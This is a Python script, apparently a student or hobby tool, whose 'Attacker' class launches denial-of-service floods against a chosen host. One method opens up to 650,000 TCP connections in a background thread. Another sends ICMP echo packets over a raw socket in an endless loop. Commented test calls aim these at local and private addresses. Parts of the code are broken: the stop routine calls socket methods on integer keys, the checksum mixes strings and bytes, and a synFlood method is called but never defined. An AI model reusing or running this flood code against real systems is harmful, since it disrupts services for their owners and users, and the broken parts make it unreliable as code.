from scapy.all import *
import time
import array#用于将bytes字节流数据转换为2B有符号整型数组
import struct#实现bytes型与其他类型数据的相互转换

class Attacker:

    def __init__(self):
        self.enableStop = False
        self.sockettcpList = {}
        self.hostname = socket.gethostname()
        self.src = socket.gethostbyname(self.hostname)
        self.p=[]

        self.synThread = None

    # 停止
    def stop(self):
        self.enableStop = True
        for s in self.sockettcpList:
            s.shutdown()
            s.close()



    #TCP全开洪泛攻击
    def allFlood(self, dst,dport):
        dport = int(dport)
        print("=" * 10)
        print("TCP全开攻击")
        print("=" * 10)
        def all():
            i = 0
            while not self.enableStop:
                self.sockettcpList[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                status = self.sockettcpList[i].connect_ex((dst, dport))
                print(status)
                print("Connect %s:%s ok" % (dst, dport))
                i += 1
                print(i)
                if i >= 650000:
                    break
                # data = self.sockettcpList[i].recv(1024)
                # print("recv:" + data.decode("utf-8"))

        allThread = Thread(target=all,  daemon=True)
        allThread.start()

    #ICMP攻击
    def icmpAttack(self,dst):
        #PING -L 65500 -T IP地址
        print("=" * 10)
        print("ICMP攻击")
        print("=" * 10)


        def icmp():
            # ICMP报文
            def checksum(packet):
                if len(packet) & 1:  # 判断报文数据长度是否奇数，若为奇数，则通过第10行在报文末尾追加字符“\0”
                    packet = packet + '\0'
                words = array.array('h', packet)
                sum = 0
                for word in words:
                    sum += (word & 0xffff)  # 运算保证累加到sum的值为word的低16位
                sum = (sum >> 16) + (sum & 0xffff)  # 将sum的高16位与低16位相加存入sum中
                sum = sum + (sum >> 16)
                return (~sum) & 0xffff  # 返回值的高16位为0，低16位为sum的反码

            header = struct.pack('bbHHh', 8, 0, 0, 1234, 5)
            '''
            构造ICMP报文的首部，
            其中，类型值为8，表示该报文为探测目标主机是否存在的回应请求报文，
            代码为0，校验和为0，标识符为1234，序号为5
            '''
            data = struct.pack('d', time.time())
            packet = header + data  # 将ICMP报文的首部与数据部分连接起来，形成报文存储在变量packet中
            chkSum = checksum(packet)  # 计算校验和
            header = struct.pack('bbHHh', 8, 0, chkSum, 1234, 5)  # 以新的校验和重新生成ICMP报文首部
            packet = header + data
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
            s.settimeout(3)
            #ip = input('please input a ip address: ')
            ip = dst
            while not self.enableStop:  # 利用循环发送探测主机的ICMP数据报文并接收应答报文
                try:
                    t1 = time.time()
                    s.sendto(packet, (ip, 0))  # 目标主机的端口号为0
                    (r_data, r_addr) = s.recvfrom(1024)  # 过函数recvfrom()接收来自目标主机的回应报文
                    # 其中，回应报文保存在bytes类型变量r_data中，目标主机地址保存在元组类型变量r_addr中，r_data中保存的报文为IP报文，其数据部分为ICMP报文
                    t2 = time.time()
                except Exception as e:
                    print('This is a error:', e)
                    continue
                print('Receive the respond from %s, data is %d bytes,time is %.2fms' \
                      % (r_addr[0], len(r_data), (t2 - t1) * 1000))
                (h1, h2, h3, h4, h5) = struct.unpack('bbHHh', r_data[
                                                              20:28])  # r_data[20：28]取IP报文序号20～27的字节流，这8字节的字节流为ICMP报文的首部，r_data[0：20]为IP报文的首
                print('type= %d,code= %d,chksum= %u,Id= %u,SN= %d' % (
                    h1, h2, h3, h4, h5))  # 输出ICMP报文首部的5个字段值，分别为类型、代码、校验和、标识符和序号。

        icmpThread=Thread(target=icmp,daemon=True)
        icmpThread.start()


if __name__ == '__main__':
    pass
    # from scapy.all import sr, IP, TCP
    #
    # ans, unans = sr(IP(dst="192.168.43.1") / TCP(dport=int(80), flags='S'))
    # for snd, rcv in ans:
    #     print(rcv.sprintf("%IP.src% is alive"))
    # attack=Attacker()
    # #attack.main()
    # attack.synFlood("127.0.0.1",80)
    # # attack.allFlood("127.0.0.1",80)
    # #attack=Thread(target=Attacker.icmpAttack,args =("100.95.220.7",), daemon=True)
    # # attack.icmpAttack("192.168.160.133")
    # #print("fds")
    # time.sleep(10)
    # attack.stop()
